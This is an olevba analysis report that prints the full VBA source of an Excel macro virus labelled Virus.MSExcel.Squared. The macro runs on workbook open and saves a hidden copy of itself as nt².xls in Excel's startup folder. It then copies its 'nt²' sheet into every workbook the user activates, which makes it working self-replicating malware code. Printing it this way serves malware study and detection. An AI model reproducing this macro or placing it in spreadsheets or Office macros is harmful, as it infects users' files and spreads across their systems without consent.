olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Squared-be7bc7da001ffcda3ec9c545201e9ab062404b97
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO nt² 
in file: Virus.MSExcel.Squared-be7bc7da001ffcda3ec9c545201e9ab062404b97 - OLE stream: 'nt²'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 








Private Sub auto_open()
    Application.OnSheetActivate = "SearchSelf"
End Sub

Private Static Sub SearchSelf()
On Error Resume Next
Const Self As String = "nt².xls"
Dim Resident As Boolean, strCurrDir As String

    Application.ScreenUpdating = False
    Resident = Dir(Application.StartupPath & "\" & Self) = Self
    If Resident Then
       If ActiveWorkbook.Sheets(1).Name <> "nt²" Then
           Workbooks(Self).Sheets("nt²").Copy before:=ActiveWorkbook.Sheets(1)
       End If
    Else
        Sheets("nt²").Select: Sheets("nt²").Copy
        strCurrDir = CurDir()
        ChDir Application.StartupPath
        Workbooks(ActiveWorkbook.Name).SaveAs FileName:=Application.StartupPath & "\" & Self
        ChDir strCurrDir
        ActiveWindow.Visible = False
        Workbooks(Self).Save
    End If
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "nt².xls!SearchSelf"
    
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
+----------+--------------------+---------------------------------------------+

